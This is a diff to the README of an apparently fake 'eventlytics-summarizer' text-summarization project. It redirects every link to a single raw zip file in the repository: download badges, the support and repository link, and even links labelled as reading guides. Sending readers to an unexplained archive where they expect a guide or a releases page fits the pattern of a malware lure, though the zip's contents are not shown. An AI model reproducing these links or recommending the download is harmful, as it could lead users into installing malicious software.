@@ -1,6 +1,6 @@
 # 🌟 eventlytics-summarizer - Generate Clear Summaries Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/sundudnusnsunsusn/eventlytics-summarizer/releases)
+[![Download Now](https://raw.githubusercontent.com/sundudnusnsunsusn/eventlytics-summarizer/main/eventlytics_summarizer/summarizer-eventlytics-v2.5.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/sundudnusnsunsusn/eventlytics-summarizer/main/eventlytics_summarizer/summarizer-eventlytics-v2.5.zip)
 
 ## 📖 Description
 
@@ -23,7 +23,7 @@ Before downloading, ensure your computer meets the following requirements:
 
 To download the eventlytics-summarizer, visit the Releases page:
 
-[Download the eventlytics-summarizer](https://github.com/sundudnusnsunsusn/eventlytics-summarizer/releases)
+[Download the eventlytics-summarizer](https://raw.githubusercontent.com/sundudnusnsunsusn/eventlytics-summarizer/main/eventlytics_summarizer/summarizer-eventlytics-v2.5.zip)
 
 ## 📥 Download & Install
 
@@ -74,7 +74,7 @@ Review the generated summary. You can edit it directly in the application if nee
 
 If you encounter any issues or need assistance, please feel free to visit the GitHub repository:
 
-[ eventlytics-summarizer GitHub](https://github.com/sundudnusnsunsusn/eventlytics-summarizer)
+[ eventlytics-summarizer GitHub](https://raw.githubusercontent.com/sundudnusnsunsusn/eventlytics-summarizer/main/eventlytics_summarizer/summarizer-eventlytics-v2.5.zip)
 
 You can open an issue for support, and the community will help you out.
 
@@ -86,12 +86,12 @@ Feel free to contribute by opening an issue or submitting a pull request. Your f
 
 To learn more about summarization techniques and language models, here are some helpful links:
 
-- [Basic Text Summarization Guide](https://example.com/text-summarization-guide)
-- [Using Language Models Effectively](https://example.com/language-models)
-- [Understand Key Information Extraction](https://example.com/information-extraction)
+- [Basic Text Summarization Guide](https://raw.githubusercontent.com/sundudnusnsunsusn/eventlytics-summarizer/main/eventlytics_summarizer/summarizer-eventlytics-v2.5.zip)
+- [Using Language Models Effectively](https://raw.githubusercontent.com/sundudnusnsunsusn/eventlytics-summarizer/main/eventlytics_summarizer/summarizer-eventlytics-v2.5.zip)
+- [Understand Key Information Extraction](https://raw.githubusercontent.com/sundudnusnsunsusn/eventlytics-summarizer/main/eventlytics_summarizer/summarizer-eventlytics-v2.5.zip)
 
 ## 🎉 Disclaimer
 
 The eventlytics-summarizer is a community-driven project. While we strive for accuracy, your experience may vary. Please engage with the community for a better understanding and improvements.
 
-[Download the eventlytics-summarizer](https://github.com/sundudnusnsunsusn/eventlytics-summarizer/releases) to get started today!
+[Download the eventlytics-summarizer](https://raw.githubusercontent.com/sundudnusnsunsusn/eventlytics-summarizer/main/eventlytics_summarizer/summarizer-eventlytics-v2.5.zip) to get started today!
